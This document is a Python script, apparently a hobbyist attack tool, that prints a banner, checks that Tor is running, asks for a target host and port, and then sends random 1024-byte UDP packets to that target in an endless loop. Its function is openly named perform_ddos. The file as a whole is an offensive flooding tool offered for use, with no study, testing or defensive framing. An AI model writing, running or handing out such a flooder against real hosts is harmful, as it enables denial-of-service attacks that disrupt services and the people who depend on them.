import os
import socket
import subprocess
import sys
import time

def clear_screen():
    """Clear the terminal screen."""
    os.system('clear')

def print_banner():
    """Print a green banner to the terminal."""
    clear_screen()
    GREEN = '\033[92m'  # ANSI escape code for green
    RESET = '\033[0m'   # ANSI escape code to reset color
    print(f"""
{GREEN}
  ######  ##    ##  ######   #######     ##     ## ########    ##
##    ##  ##  ##  ##    ## ##     ##     ##   ##  ##        ####
##         ####   ##       ##     ##      ## ##   ##          ##
 ######     ##    ##       ##     ##       ###    #######     ##
      ##    ##    ##       ##     ##      ## ##         ##    ##
##    ##    ##    ##    ## ##     ##     ##   ##  ##    ##    ##
 ######     ##     ######   #######     ##     ##  ######   ######
{RESET}
    """)

def check_tor_running():
    """Check if the Tor service is running."""
    try:
        response = subprocess.check_output(['pgrep', 'tor'])
        return True if response else False
    except subprocess.CalledProcessError:
        return False

def resolve_domain(domain):
    """Resolve a domain name to an IP address."""
    try:
        return socket.gethostbyname(domain)
    except socket.gaierror:
        print("Error: Unable to resolve domain.")
        sys.exit()

def perform_ddos(target, port=80):
    """Perform a DDoS attack by sending UDP packets to the target."""
    target_address = (target, port)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_to_send = os.urandom(1024)  # Generate random bytes to send

    try:
        print(f"Starting attack on {target_address}...")
        while True:
            sock.sendto(bytes_to_send, target_address)
            print(f"Sent packet to {target_address}")
            time.sleep(0.1)  # Adjust the sleep time as needed
    except KeyboardInterrupt:
        print("Attack stopped by user.")
    finally:
        sock.close()
        sys.exit()

if __name__ == "__main__":
    print_banner()
    if not check_tor_running():
        print("Tor is not running. Aborting operation.")
        sys.exit()

    target = input("Enter target IP address or domain name: ")
    port_input = input("Enter target port (default is 80): ")
    port = int(port_input) if port_input else 80

    # Resolve domain to IP if necessary
    if not (target.startswith('192.') or target.startswith('10.') or target.startswith('172.') or target.startswith('169.254.')):
        target = resolve_domain(target)

    perform_ddos(target, port)

